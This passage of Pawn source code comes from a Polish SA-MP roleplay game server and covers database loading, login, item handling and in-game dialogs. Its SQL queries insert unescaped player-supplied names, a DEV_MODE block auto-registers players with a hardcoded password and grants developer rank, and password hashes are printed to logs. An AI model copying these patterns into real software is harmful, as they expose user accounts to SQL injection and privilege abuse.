					pickupId = CreateDynamicPickup(1239, 2, outX, outY, outZ, outVirtualWorld, 0, -1);
				}
			}
		}

		new query[64];
		format(query, sizeof(query), "UPDATE doors SET outPickupId=%d WHERE uid=%d;", pickupId, uid);
		mysql_query(DB_HANDLE, query, false);

	}


	cache_delete(cache);

	printf(">>> Loaded %d doors.", rows);
}

stock ShowDialogMemberPayDay(playerid)
{
	/*new guid = pVal[playerid];
	new muid = pVal2[playerid];
	new header[64];
	if(PlayerCache[muid][pGroup] == guid)
	format(header, sizeof(header), "Aktualna wyp³ata %s: $%d", strreplace(PlayerCache[muid][pName], '_', ' '), PlayerCache[muid][pGroupReward]);
	else if(PlayerCache[muid][pGroup2] == guid)
	format(header, sizeof(header), "Aktualna wyp³ata %s: $%d", strreplace(PlayerCache[muid][pName], '_', ' '), PlayerCache[muid][pGroupReward2]);
	else if(PlayerCache[muid][pGroup3] == guid)
	format(header, sizeof(header), "Aktualna wyp³ata %s: $%d", strreplace(PlayerCache[muid][pName], '_', ' '), PlayerCache[muid][pGroupReward3]);
	return ShowPlayerDialog(playerid, D_MEMBER_PAYDAY, DIALOG_STYLE_INPUT, header, ""HEX_WHITE"Wpisz poni¿ej now¹ wyp³ate dla cz³onka:", "Gotowe", "Anuluj");*/
}

stock CreateTextDraws()
{
	getdate(gyear, gmonth, gday);
	new str[128];
	format(str, sizeof(str), "~w~LC~b~~h~~h~-~w~RP.PL: %02d.%02d.%02d", gyear-2000, gmonth, gday);
	GlobalLogo = TextDrawCreate(54.335029, 425.271667, str);
	TextDrawLetterSize(GlobalLogo,  0.251358, 1.210700);
	TextDrawAlignment(GlobalLogo, 2);
	TextDrawColor(GlobalLogo, -1);
	TextDrawSetShadow(GlobalLogo, 0);
	TextDrawSetOutline(GlobalLogo, 1);
	TextDrawBackgroundColor(GlobalLogo, 167772198);
	TextDrawFont(GlobalLogo, 1);
	TextDrawSetProportional(GlobalLogo, 1);
	TextDrawSetShadow(GlobalLogo, 0);

	RadioTextDraw = TextDrawCreate(1.797235, 437.528747, "~b~~h~~h~~h~San News~w~ aktualnie nic nie nadaje..");
	TextDrawLetterSize(RadioTextDraw,0.190987, 0.993281);
	TextDrawTextSize(RadioTextDraw,1236.000000, 0.000000);
	TextDrawAlignment(RadioTextDraw, 1);
	TextDrawColor(RadioTextDraw, -1);
	TextDrawUseBox(RadioTextDraw, 1);
	TextDrawBoxColor(RadioTextDraw,  15);
	TextDrawSetShadow(RadioTextDraw, 0);
	TextDrawSetOutline(RadioTextDraw, 1);
	TextDrawBackgroundColor(RadioTextDraw, 83);
	TextDrawFont(RadioTextDraw, 1);
	TextDrawSetProportional(RadioTextDraw, 1);
	TextDrawSetShadow(RadioTextDraw, 0);

	PenalityTextDraw = TextDrawCreate(7.481735, 272.249847, "~r~Kara~w~~n~Gracz: Hype~n~Nadal: Hype~n~~y~Masowy DM w centrum");
	TextDrawLetterSize(PenalityTextDraw, 0.200876, 1.004995);
	TextDrawAlignment(PenalityTextDraw, 1);
	TextDrawColor(PenalityTextDraw, -1);
	TextDrawSetShadow(PenalityTextDraw, 0);
	TextDrawSetOutline(PenalityTextDraw, 1);
	TextDrawBackgroundColor(PenalityTextDraw, 83);
	TextDrawFont(PenalityTextDraw, 1);
	TextDrawSetProportional(PenalityTextDraw, 1);
	TextDrawSetShadow(PenalityTextDraw, 0);

}

stock AppPath(i)
{
	new path[64]; format(path, sizeof(path), APPS_FOLDER"%d.ini", i);
	return path;
}

stock SaveApps()
{
	/*new count;
	for(new i; i<MAX_APPS; i++)
	{
		if(AppCache[i][appOwner])
		{
			if(!dfile_FileExists(AppPath(i)))
			dfile_Create(AppPath(i));
			dfile_Open(AppPath(i));
			dfile_WriteInt("ID", i);
			dfile_WriteInt("Owner", AppCache[i][appOwner]);
			dfile_WriteInt("VW", AppCache[i][appVW]);
			dfile_WriteFloat("X", AppCache[i][appX]);
			dfile_WriteFloat("Y", AppCache[i][appY]);
			dfile_WriteFloat("Z", AppCache[i][appZ]);
			dfile_WriteString("Text", AppCache[i][appText]);
			dfile_WriteInt("State", AppCache[i][appState]);
			dfile_WriteInt("PlayerUID", AppCache[i][appPlayerUID]);
			dfile_WriteInt("Phone", AppCache[i][appPhone]);
			dfile_SaveFile(); dfile_CloseFile();
			count++;
		}
		else
		break;
	}
	printf(">>> Saved %d group applications.", count);*/
}

stock LoadApps()
{
	/*new query[64] = "SELECT * FROM apps";
	mysql_query(DB_HANDLE, query);

	mysql_store_result();

	new data[524], i;
	while(mysql_fetch_row(data))
	{
		sscanf(data, "p<|>ds[128]dfffdddd",
		AppCache[i][appOwner], 	
		AppCache[i][appText],  	
		AppCache[i][appID],   	
		AppCache[i][appX],     	
		AppCache[i][appY],     	
		AppCache[i][appZ],     	
		AppCache[i][appVW],    	
		AppCache[i][appPlayerUID],
		AppCache[i][appState], 	
		AppCache[i][appPhone]);	

		i++;
	}

	cache_delete(cache);

	printf(">>> Loaded %d group apps.", i);*/
}

stock ContactPath(contactid)
{
	new path[64]; format(path, sizeof(path), FOLDER_CONTACTS"%d.ini", contactid);
	return path;
}





stock LoadActors()
{
	
	new Cache:result = mysql_query(DB_HANDLE, "SELECT * FROM actors", true);
	new rows = 0;
	cache_get_row_count(rows);

	for(new i=0; i<rows; i++){
		cache_get_value_name_int(i, "aUID", ActorCache[i][aUID]);
		cache_get_value_name_int(i, "aType", ActorCache[i][aType]);
		cache_get_value_name(i, "aName", ActorCache[i][aName]);
		cache_get_value_name(i, "aAnimLib", ActorCache[i][aAnimLib]);
		cache_get_value_name(i, "aAnimName", ActorCache[i][aAnimName]);
		cache_get_value_name_float(i, "aPosX", ActorCache[i][aPosX]);
		cache_get_value_name_float(i, "aPosY", ActorCache[i][aPosY]);
		cache_get_value_name_float(i, "aposZ", ActorCache[i][aPosZ]);
		cache_get_value_name_float(i, "aAng", ActorCache[i][aAng]);
		cache_get_value_name_int(i, "aVW", ActorCache[i][aVW]);
		cache_get_value_name_int(i, "aSkin", ActorCache[i][aSkin]);
		cache_get_value_name_int(i, "aRepeat", ActorCache[i][aRepeat]);
		cache_get_value_name(i, "aText", ActorCache[i][aText]);
		
		if(ActorCache[i][aType])
		{
			ActorCache[i][aID] = CreateDynamicActor(ActorCache[i][aSkin],ActorCache[i][aPosX], ActorCache[i][aPosY], ActorCache[i][aPosZ], ActorCache[i][aAng],
			1, 100.0, ActorCache[i][aVW], 0, -1);
			new str[64];
			format(str, sizeof(str), "%s\n(aktor)", strreplace(ActorCache[i][aName], '_', ' '));
			ActorCache[i][aLabel] = CreateDynamic3DTextLabel(str, PLAYER_NORMAL_COLOR, ActorCache[i][aPosX],ActorCache[i][aPosY] ,ActorCache[i][aPosZ]+1.1, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, ActorCache[i][aVW], 0,-1);
			if(!Isnull(ActorCache[i][aAnimLib]))
			{
				if(ActorCache[i][aRepeat])
					ApplyDynamicActorAnimation(ActorCache[i][aID], ActorCache[i][aAnimLib], ActorCache[i][aAnimName], 4.1, 1, 0, 0, 0, 0);
				else
					ApplyDynamicActorAnimation(ActorCache[i][aID], ActorCache[i][aAnimLib], ActorCache[i][aAnimName], 4.1, 0, 0, 0, 1, 0);
			}
		}
	}
	cache_delete(result);
	printf(">>> Loaded %d actors.", rows);
}

stock DoorPath(doorid)
{
	new path[64];
	format(path, sizeof(path), FOLDER_DOORS"%d.ini", doorid);
	return path;
}

stock SaveZones()
{
	/*for(new i; i<MAX_ZONES; i++)
	{
		dfile_Open(ZonePath(i));
		dfile_WriteFloat("MinX", ZoneData[i][zMinX]);
		dfile_WriteFloat("MinY", ZoneData[i][zMinY]);
		dfile_WriteFloat("MaxY", ZoneData[i][zMaxX]);
		dfile_WriteFloat("MaxZ", ZoneData[i][zMaxY]);
		dfile_WriteInt("Yard", ZoneData[i][zYard]);
		dfile_WriteInt("CostH", ZoneData[i][zCostH]);
		dfile_WriteInt("CostB", ZoneData[i][zCostB]);
		dfile_WriteString("Name", ZoneData[i][zName]);
		dfile_SaveFile();
		dfile_CloseFile();
	}*/
}

forward RandomAgain(playerid);
public RandomAgain(playerid)
{
	RandomCamera(playerid);
}

stock RandomCamera(playerid)
{
	if(PlayerCache[playerid][pUID])
	return 1;
	new num = random(11);
	while(num == pLast[playerid])
	num = random(11);
	pLast[playerid] = num;
	switch(num)
	{
		case 0:
		{
			InterpolateCameraPos(playerid, 1346.177734, -1144.530883, 26.984342, 1216.184326, -1144.878906, 25.081375, 10000);
			InterpolateCameraLookAt(playerid, 1341.189208, -1144.524536, 26.645969, 1211.190917, -1144.872558, 24.824888, 1000);
		}
		case 1:
		{
			InterpolateCameraPos(playerid, 605.103576, -1879.486694, 9.096667, 481.130676, -1868.522583, 8.461681, 10000);
			InterpolateCameraLookAt(playerid, 600.287658, -1880.774169, 8.710333, 476.416473, -1870.149658, 8.102615, 1000);
		}
		case 2:
		{
			InterpolateCameraPos(playerid, 1009.995361, -697.430725, 164.013320, 1077.205444, -825.822265, 129.347351, 10000);
			InterpolateCameraLookAt(playerid, 1012.742919, -701.554931, 163.348541, 1079.897583, -829.911499, 128.332229, 1000);
		}
		case 3:
		{
			InterpolateCameraPos(playerid, 1528.313354, -932.075988, 119.118019, 1414.034057, -773.713684, 112.730422, 10000);
			InterpolateCameraLookAt(playerid, 1525.075561, -928.271118, 118.919174, 1410.611694, -770.071350, 112.586227, 1000);
		}
		case 4:
		{
			InterpolateCameraPos(playerid, 1498.185546, -1347.921020, 346.940399, 1629.692382, -1299.682983, 254.350875, 10000);
			InterpolateCameraLookAt(playerid, 1502.130371, -1345.656005, 344.864868, 1632.065429, -1296.667846, 251.144989, 1000);
		}
		case 5:
		{
			InterpolateCameraPos(playerid, 2343.572509, -1563.174560, 25.125074, 2341.632568, -1493.650024, 30.020772, 10000);
			InterpolateCameraLookAt(playerid, 2339.617675, -1560.115844, 25.066486, 2338.710449, -1497.593383, 29.065744, 100);
		}
		case 6:
		{
			InterpolateCameraPos(playerid, 2880.506103, -1504.461181, 27.994499, 2882.288085, -1316.511352, 27.824987, 10000);
			InterpolateCameraLookAt(playerid, 2876.059570, -1502.226440, 28.478433, 2879.272949, -1320.498901, 27.735466, 10000);
		}
		case 7:
		{
			InterpolateCameraPos(playerid, 2800.035156, -2052.232177, 104.765739, 2493.232177, -2050.603515, 70.979499, 10000);
			InterpolateCameraLookAt(playerid, 2795.238037, -2052.331054, 103.359199, 2488.284423, -2050.489013, 70.267089, 10000);
		}
		case 8:
		{
			InterpolateCameraPos(playerid, 2199.569091, -1784.587646, 54.049873, 2415.513916, -1788.059326, 37.634094, 10000);
			InterpolateCameraLookAt(playerid, 2203.016357, -1781.151977, 52.904212, 2411.857421, -1784.689697, 37.108043, 10000);
		}
		case 9:
		{
			InterpolateCameraPos(playerid, 1361.789428, -1872.679809, 24.922374, 1534.798828, -1873.391967, 22.328565, 10000);
			InterpolateCameraLookAt(playerid, 1366.787475, -1872.698852, 24.781770, 1539.773803, -1873.329223, 21.833288, 10000);
		}
		case 10:
		{
			InterpolateCameraPos(playerid, 1044.103393, -2038.274169, 89.802391, 1201.820556, -2036.234252, 77.274482, 10000);
			InterpolateCameraLookAt(playerid, 1049.079101, -2038.131713, 89.330757, 1206.756103, -2036.308959, 76.477439, 10000);
		}
	}
	return SetTimerEx("RandomAgain", 11000, false, "i", playerid);
}

 forward OnPassswordHash(playerid);
 public OnPassswordHash(playerid){
	new salt[11];
	new list[58] = "ABCDEFGHIJKLMNOPRSTUWXYZ0123456789abcdefghiklmnoprstywxyz";

	for(new i; i<10; i++)
	format(salt, sizeof(salt), "%s%c", salt, list[random(56)]);

 	new hash[250];
	bcrypt_get_hash(hash);

	printf("register hash: %s", hash);
	printf("register salt: %s", salt);

	new newPlayerQuery[1024];
	format(newPlayerQuery, sizeof(newPlayerQuery), "INSERT INTO players (hash, salt,name, gender, bornDate) VALUES ('%s', '%s', '%s', '%d', '%d')", hash, salt,RegisterCache[playerid][rName], RegisterCache[playerid][rSex], RegisterCache[playerid][rBornDate]);
	new Cache:cache = mysql_query(DB_HANDLE, newPlayerQuery);
	cache_delete(cache);
	SetPlayerName(playerid, RegisterCache[playerid][rName]);
	LoadPlayerData(playerid);
	if( DEV_MODE == 1){
		PlayerCache[playerid][pLevel] = DEVELOPER;
	}
	return ShowDialogLogin(playerid);
 }

stock UseItemOption(playerid, option, uid)
{
	if(ItemCache[uid][iActive])
	return GameTextForPlayer(playerid, "~b~~h~~h~~h~schowaj przedmiot", 3000, 4);
	if(ItemCache[uid][iState] != ITEM_STATE_EQ)
	return 1;
	if(ItemCache[uid][iOwner] != PlayerCache[playerid][pUID])
	return TextDrawForPlayerEx(playerid, 1, "Ten przedmiot nie nalezy do Ciebie.", 3000);
	
	new query[256];

	switch(option)
	{
		case 1:
		{
			if(IsPlayerInAnyVehicle(playerid))
			{
				ItemCache[uid][iState] = ITEM_STATE_VEHICLE;
				ItemCache[uid][iOwner] = PlayerCache[playerid][pCurrentVehicle][vUID];

				format(query, sizeof(query), "UPDATE items SET state = '%d', owner = '%d' WHERE uid = '%d'", 
				ITEM_STATE_VEHICLE, 
				ItemCache[uid][iOwner] , 
				ItemCache[uid][iUID]);
				new Cache:cache = mysql_query(DB_HANDLE, query);
				cache_delete(cache);

				return SendPlayerMe(playerid, "odk³ada jakiœ przedmiot w pojeŸdzie.");
			}
			GetPlayerPos(playerid, ItemCache[uid][iX], ItemCache[uid][iY], ItemCache[uid][iZ]);
			ItemCache[uid][iVW] = GetPlayerVirtualWorld(playerid);
			ItemCache[uid][iState] = 1;

			format(query, sizeof(query), "odk³ada jakiœ przedmiot.");

			SendPlayerMe(playerid, query);
			ApplyAnimation(playerid, "bomber", "bom_plant", 4.1, 0, 0, 0, 0, 0, 0);

			format(query, sizeof(query), "UPDATE items SET X = '%f', Y = '%f', Z = '%f', vw = '%f', state = '1' WHERE uid = '%d'",
			ItemCache[uid][iX], ItemCache[uid][iY], ItemCache[uid][iZ], ItemCache[uid][iVW], ItemCache[uid][iUID]);
			mysql_query(DB_HANDLE, query);


		}
		case 2:
		{
			new list[1024];
			for(new i; i<=GetPlayerPoolSize(); i++)
			{
				if(IsPlayerConnected(i))
				{
					if(IsPlayerInRangeOfPlayer(i, playerid, 5.0))
					{
						format(list, sizeof(list), "%s%d\t%s\n", list, PlayerCache[i][pUID], RPName(i));
					}
				}
			}
			if(!strlen(list))
			return ShowDialogInfo(playerid, "Nie znaleziono graczy w pobli¿u.");
			return ShowPlayerDialog(playerid, D_NEARBY_PLAYERS, DIALOG_STYLE_LIST, "Pobliscy gracze", list, "Wybierz", "Anuluj");
		}
		case 3:
		{
			if(ItemCache[uid][iType] == 12)
			{
				ItemCache[uid][iAttachX] = 0;
				ItemCache[uid][iAttachY] = 0;
				ItemCache[uid][iAttachZ] = 0;
				ItemCache[uid][iSizeX] = 1;
				ItemCache[uid][iSizeY] = 1;
				ItemCache[uid][iSizeZ] = 1;
				ItemCache[uid][iAttachrX] = 0;
				ItemCache[uid][iAttachrY] = 0;
				ItemCache[uid][iAttachrZ] = 0;

				format(query, sizeof(query), "UPDATE items SET attachX = '0', attachY = '0', attachZ = '0', sizeX = '1', sizeY = '1', sizeZ = '1', attachrX = '0', attachrY = '0', attachrZ = '0' WHERE uid = '%d'",
				ItemCache[uid][iUID]);
				new Cache:cache = mysql_query(DB_HANDLE, query);
				cache_delete(cache);
				return ShowDialogInfo(playerid, "Akcesorium doczepiane zosta³o pomyœlnie zresetowane!");
			}
			return ShowDialogInfo(playerid, "Ten przedmiot nie jest doczepianym akcesorium, wiêc nie mo¿esz go zresetowaæ.");
		}
		case 4:
		{
			if(ItemCache[uid][iType] == 13)
				return ShowDialogInfo(playerid, "Nie mo¿esz schowaæ tego przedmiotu.");
			new list[525];
			for(new i; i<MAX_ITEMS; i++)
			{
				if(ItemCache[i][iState] == 0)
				{
					if(ItemCache[i][iType] == 13)
					{
						if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
						format(list, sizeof(list), "%s%d\t%s\n", list, i, ItemCache[i][iName]);
					}
				}
			}
			if(!strlen(list))
			return ShowDialogInfo(playerid, "Nie posiadasz ¿adnego przedmiotu przechowawczego.");
			return ShowPlayerDialog(playerid, D_BAGS, DIALOG_STYLE_LIST, "Schowaj przedmiot", list, "Schowaj", "Anuluj");
		}
		case 5:
		{
			ItemCache[uid][iState] = 2;

			format(query, sizeof(query), "UPDATE items SET state = '2' WHERE uid = '%d'", ItemCache[uid][iUID]);
			mysql_query(DB_HANDLE, query);

			format(query, sizeof(query), "niszczy przedmiot %s", ItemCache[uid][iName]);
			return SendPlayerMe(playerid, query);
		}
	}
	return 1;
}

stock ShowDialogNearPlayers(playerid)
{
	new pvw = GetPlayerVirtualWorld(playerid);
	new Float:X, Float:Y, Float:Z;
	new list[1025], pinfo[64];
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(i != playerid)
			{
				if(pvw == GetPlayerVirtualWorld(i))
				{
					GetPlayerPos(i, X, Y, Z);
					if(IsPlayerInRangeOfPoint(playerid, 5.0, X, Y, Z))
					{
						format(pinfo, sizeof(pinfo), "%d\t%s\n", PlayerCache[i][pUID], RPName(i));
						strins(list, pinfo, strlen(list));
					}
				}
			}
		}
	}
	if(!strlen(list))
	return ShowDialogInfo(playerid, "Nie znaleziono graczy w pobli¿u.");
	return ShowPlayerDialog(playerid, D_V_NEAR_PLAYERS, DIALOG_STYLE_LIST, "Pobliscy gracze", list, "Wybierz", "Anuluj");
}

stock RemoveMapBuildings(playerid)
{
	RemoveBuildingForPlayer(playerid, 1412, 0.0, 0.0, 0.0, 6000.0);
	RemoveBuildingForPlayer(playerid, 1676, 0.0, 0.0, 0.0, 6000.0);
	RemoveBuildingForPlayer(playerid, 1438, 0.0, 0.0, 0.0, 6000.0);
	RemoveBuildingForPlayer(playerid, 1283, 0.0, 0.0, 0.0, 6000.0);
	RemoveBuildingForPlayer(playerid, 1284, 0.0, 0.0, 0.0, 6000.0);
	RemoveBuildingForPlayer(playerid, 1315, 0.0, 0.0, 0.0, 6000.0);
	RemoveBuildingForPlayer(playerid, 16778, 0.0, 0.0, 0.0, 6000.0);
	RemoveBuildingForPlayer(playerid, 3221, 0.0, 0.0, 0.0, 6000.0);
	RemoveBuildingForPlayer(playerid, 16000, 0.0, 0.0, 0.0, 6000.0);
	RemoveBuildingForPlayer(playerid, 626, 0.0, 0.0, 0.0, 6000.0);
	RemoveBuildingForPlayer(playerid, 6130, 1117.5859, -1490.0078, 32.7188, 0.25);
	RemoveBuildingForPlayer(playerid, 6255, 1117.5859, -1490.0078, 32.7188, 0.25);
}

public OnPlayerConnect(playerid)
{
	if(!DB_HANDLE)
		Kick(playerid);

	if(DEV_MODE){

		
		SetPlayerName(playerid, "Sam_Clappers");
		GetPlayerName(playerid, RegisterCache[playerid][rName], 24);
		bcrypt_hash(playerid,"OnPassswordHash","12345678",12);
		
		
	}
	
	pPriv[playerid] = true;
	pCalling[playerid] = -1;
	pTalking[playerid] = -1;

	RemoveMapBuildings(playerid);
	EnablePlayerCameraTarget(playerid, 1);

	new count;
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(i != playerid)
			{
				if(!strcmp(PlayerIP(i), PlayerIP(playerid), true))
				{
					count++;
					if(count == 3)
					{
						KickPlayer(i, "System", "Wiecej niz 3 identycznych IP na tym samym serwerze");
						Kick(playerid);
						break;
					}
				}
			}
		}
	}

	ClearChat(playerid);
	TogglePlayerSpectating(playerid, 1);
	SetPlayerVirtualWorld(playerid, -1);
	SetPlayerColor(playerid, COLOR_BLACK);
	TextDrawShowForPlayer(playerid, GlobalLogo);
	RandomCamera(playerid);
	LoadPlayerData(playerid);
	

}

stock LoadPlayerData(playerid)
{
	new query[128];
	format(query, sizeof(query), "SELECT * FROM players WHERE name = '%s' LIMIT 1;", ReturnPlayerName(playerid));

	new Cache:cache = mysql_query(DB_HANDLE, query);
	

	if(cache_num_rows())
	{
		cache_get_value_name_int(0, "uid", PlayerCache[playerid][pUID]);
		cache_get_value_name(0, "hash", PlayerCache[playerid][pHash]);
		cache_get_value_name(0, "salt", PlayerCache[playerid][pSalt]);
		cache_get_value_name(0, "name", PlayerCache[playerid][pName]);
		cache_get_value_name_int(0, "gender", PlayerCache[playerid][pGender]);
		cache_get_value_name_int(0, "skin", PlayerCache[playerid][pSkin]);
		cache_get_value_name_float(0, "health", PlayerCache[playerid][pHealth]);
		cache_get_value_name_int(0, "cash", PlayerCache[playerid][pCash]);
		cache_get_value_name_int(0, "tutorialLevel", PlayerCache[playerid][pTutorialLevel]);
		cache_get_value_name_int(0, "strenght", PlayerCache[playerid][pStrenght]);
		cache_get_value_name_int(0, "level", PlayerCache[playerid][pLevel]);
		cache_get_value_name_int(0, "BW_Time", PlayerCache[playerid][pBW_Time]);
		cache_get_value_name_int(0, "BW_Reason", PlayerCache[playerid][pBW_Reason]);
		cache_get_value_name_int(0, "AJ_Time", PlayerCache[playerid][pAJ_Time]);
		
		cache_get_value_name_int(0, "playTime", PlayerCache[playerid][pPlayTime]);
		cache_get_value_name_int(0, "score", PlayerCache[playerid][pScore]);
		cache_get_value_name_int(0, "houseSpawn", PlayerCache[playerid][pHouseSpawn]);
		cache_get_value_name_int(0, "bank", PlayerCache[playerid][pBank]);
		cache_get_value_name_float(0, "posX", PlayerCache[playerid][pPosX]);
		cache_get_value_name_float(0, "posY", PlayerCache[playerid][pPosY]);
		cache_get_value_name_float(0, "posY", PlayerCache[playerid][pPosZ]);
		cache_get_value_name_int(0, "posVW", PlayerCache[playerid][pPosVW]);
		cache_get_value_name_int(0, "bornDate", PlayerCache[playerid][pBornDate]);
		cache_get_value_name_int(0, "ID_Card", PlayerCache[playerid][pID_Card]);
		cache_get_value_name_int(0, "drivingLicense", PlayerCache[playerid][pDrivingLicense]);
		cache_get_value_name_int(0, "bankAccount", PlayerCache[playerid][pBankAccount]);
		cache_get_value_name_int(0, "OOC", PlayerCache[playerid][pOOC]);
		cache_get_value_name_int(0, "favAnim", PlayerCache[playerid][pFavAnim]);
		cache_get_value_name_int(0, "jailTime", PlayerCache[playerid][pJailTime]);
		cache_get_value_name_float(0, "jailX", PlayerCache[playerid][pJailX]);
		cache_get_value_name_float(0, "jailY", PlayerCache[playerid][pJailY]);
		cache_get_value_name_float(0, "jailZ", PlayerCache[playerid][pJailZ]);
		cache_get_value_name_int(0, "jailVW", PlayerCache[playerid][pJailVW]);
		cache_get_value_name_int(0, "lastTraining", PlayerCache[playerid][pLastTraining]);
		cache_get_value_name_int(0, "objectEditor", PlayerCache[playerid][pObjectEditor]);
		cache_get_value_name_int(0, "gymBoostTime", PlayerCache[playerid][pGymBoostTime]);
		ShowDialogLogin(playerid);
	}	
	else
	{
		ShowDialogNotFound(playerid);
	}
	
	cache_delete(cache);

	new str[256];
	format(str, sizeof(str), "[LOG] [JOIN] SAMP_NAME: %s, SAMP_ID: %d, UID: %d, SAMP_IP: %s", ReturnPlayerName(playerid), playerid, PlayerCache[playerid][pUID], PlayerIP(playerid));
	CreateLog(LOG_TYPE_GAME_CONNECTION, playerid, str);

	return 1;
}

stock ShowDialogChangeDoorName(playerid)
return ShowPlayerDialog(playerid, D_CHANGE_DOOR_NAME, DIALOG_STYLE_INPUT, "Zmieñ nazwê drzwi", ""HEX_WHITE"Wpisz poni¿ej now¹ nazwê drzwi:", "ZatwierdŸ", "Anuluj");


stock ShowDialogChangeUrl(playerid)
return ShowPlayerDialog(playerid, D_CHANGE_URL, DIALOG_STYLE_INPUT, "Zmieñ URL", ""HEX_WHITE"WprowadŸ link do stacji internetowej:\n", "Gotowe", "Anuluj");

stock ShowDialogDoorGroup(playerid)
return ShowPlayerDialog(playerid, D_DOOR_GROUP, DIALOG_STYLE_INPUT, "Podpisz budynek", ""HEX_WHITE"Podaj slot grupowy:\n\n(slot grupy mo¿esz sprawdziæ poprzez komendê /g)", "Podpisz", "Anuluj");

stock ShowDialogDoorCost(playerid)
return ShowPlayerDialog(playerid, D_DOOR_COST, DIALOG_STYLE_INPUT, "Zmieñ op³atê za przejœcie przez drzwi", ""HEX_WHITE"Wpisz poni¿ej wartoœæ:\nNp: 1", "Zmieñ", "Anuluj");

stock ShowDialogChangeGroupName(playerid)
return ShowPlayerDialog(playerid, D_CHANGE_GROUP_NAME, DIALOG_STYLE_INPUT, "Zmieñ nazwê grupy", ""HEX_WHITE"Wpisz poni¿ej now¹ nazwê grupy:\n", "ZatwierdŸ", "Anuluj");

stock PermsToStr(perms)
{
	new str[128];
	if(perms == 1)
	str = "+A";
	if(perms == 0)
	str = "-A";
	return str;
}

stock GetActorInRange(playerid)
{
	new Float:x, Float:y, Float:z;
	for(new i; i<LastaUID; i++)
	{
		if(ActorCache[i][aType])
		{
			GetDynamicActorPos(ActorCache[i][aID], x, y, z);
			if(IsPlayerInRangeOfPoint(playerid, 5.0, x, y, z))
			{
				if(GetPlayerVirtualWorld(playerid) == ActorCache[i][aVW])
				{
					return ActorCache[i][aUID];
				}
			}
		}
	}
	return 0;
}

stock ShowDialogGroupMembers(playerid)
{
	/*new guid = pVal[playerid];
	new info[128];
	new list[525] = "#\tCz³onek\tUprawnienia\n";
	new count;
	for(new i=pPage[playerid]; i<LastUID; i++)
	{
		if(i == 0)
		continue;
		if(PlayerCache[i][pGroup] == guid || PlayerCache[i][pGroup2] == guid || PlayerCache[i][pGroup3] == guid)
		{
			format(info, sizeof(info), "%d\t%s\t%s\n", i, PlayerCache[i][pName], GetUserPerms(i, guid));
			strins(list, info, strlen(list));
			count++;
			if(count == 10)
			{
				pPage[playerid] = i+1;
				break;
			}
		}
	}
	if(count)
	{
		for(new i=pPage[playerid]; i<LastUID; i++)
		{
			if(PlayerCache[i][pGroup] == guid || PlayerCache[i][pGroup2] == guid || PlayerCache[i][pGroup3] == guid)
			{
				strins(list, " \nDalej\nWstecz", strlen(list));
				return ShowPlayerDialog(playerid, D_GROUP_MEMBERS, DIALOG_STYLE_TABLIST_HEADERS, "Cz³onkowie (wybierz aby edytowaæ)", list, "Wybierz", "Anuluj");
			}
		}
		strins(list, " \nWstecz", strlen(list));
		return ShowPlayerDialog(playerid, D_GROUP_MEMBERS, DIALOG_STYLE_TABLIST_HEADERS, "Cz³onkowie (wybierz aby edytowaæ)", list, "Wybierz", "Anuluj");
	}
	pPage[playerid] = 0;*/
	return ShowDialogInfo(playerid, "To ju¿ wszystko.");
}

stock ShowDialogManageMember(playerid)
{
	new header[64];
	format(header, sizeof(header), "Zarz¹dzaj cz³onkiem: %s", PlayerCache[pVal2[playerid]][pName]);
	return ShowPlayerDialog(playerid, D_MANAGE_MEMBER, DIALOG_STYLE_TABLIST_HEADERS, header, "#\tFunkcja\n1 Wyrzuæ cz³onka z grupy\n2 Zmieñ uprawnienia\n3 Ustaw wyp³atê", "Wybierz", "Powrót");
}

stock ShowDialogMemberPerms(playerid)
{
	new guid = pVal[playerid];
	new muid = pVal2[playerid];
	new header[64], info[256]; format(header, sizeof(header), "Edytuj uprawnienia cz³onka %s\n", PlayerCache[muid][pName]);
	format(info, sizeof(info), ""HEX_YELLOW"Aktualne uprawnienia cz³onka: "HEX_WHITE"%s\n\nZabierz lub nadaj uprawnienia dla cz³onka jak w poni¿szym przyk³adzie:\n\
	+A by nadaæ uprawnienie lub -A by je odj¹æ.", GetUserPerms(muid, guid));
	ShowPlayerDialog(playerid, D_GROUP_MEMBER_PERMS, DIALOG_STYLE_INPUT, header, info, "Gotowe", "Anuluj");
	PlayerTextDrawSetString(playerid, ObjectInfo[playerid], "~y~A - ~w~Zarzadzanie grupa~y~ B - ~w~Edycja wnetrz ~y~C - ~w~Zapraszanie ~n~~y~D - ~w~Dostep do /zamknij ~y~E - ~w~Dostep do pojazdow ~y~F - ~w~Zamawianie produktow");
	return PlayerTextDrawShow(playerid, ObjectInfo[playerid]);
}

new BusTimer[MAX_PLAYERS];

stock DeleteSomething(string[])
{
	new newstr[128];
	format(newstr, sizeof(newstr), string);
	new start, end;
	for(new i=0; i<strlen(newstr); i++)
	{
		if(newstr[i] == '{')
		{
			start = i;
		}
		if(newstr[i] == '}')
		{
			end = i;
		}
	}
	if(end)
	{
		strdel(newstr, start, end+1);
	}
	return newstr;
}



/*forward Bus(playerid, ouid);
public Bus(playerid, ouid)
{
	new keys, ud, lr;
	GetPlayerKeys(playerid, keys, ud, lr);
	new uid = PlayerCache[playerid][pUID];
	if(lr == KEY_RIGHT)
	{
		for(new i=pVal[playerid]+1; i<MAX_OBJECTS; i++)
		{
			if(ObjectCache[i][oState] == 0)
			{
				if(ObjectCache[i][oModel] == 1257)
				{
					if(!IsPlayerInRangeOfPoint(playerid, 5.0, ObjectCache[i][oX], ObjectCache[i][oY], ObjectCache[i][oZ]))
					{
						SetPlayerCameraPos(playerid, ObjectCache[i][oX], ObjectCache[i][oY], ObjectCache[i][oZ]+300);
						SetPlayerCameraLookAt(playerid, ObjectCache[i][oX], ObjectCache[i][oY], ObjectCache[i][oZ], CAMERA_MOVE);
						pVal[playerid] = i;
						new Float:num = PlayerCache[uid][pPosX]+ObjectCache[i][oX] - PlayerCache[uid][pPosY]+ObjectCache[i][oY];
						new time = floatround(num);
						time*=30;
						new str[64];
						if(time/1000/2 >= 0)
						format(str, sizeof(str), "Przystanek: %s~n~Koszt: ~g~~h~$%d", DeleteSomething(ObjectCache[i][oName]), time/1000/2);
						else
						format(str, sizeof(str), "Przystanek: %s~n~Koszt: ~g~~h~$%d", DeleteSomething(ObjectCache[i][oName]), (time/1000/2)*-1);
						PlayerTextDrawSetString(playerid, RadarTextDraw[playerid], str);
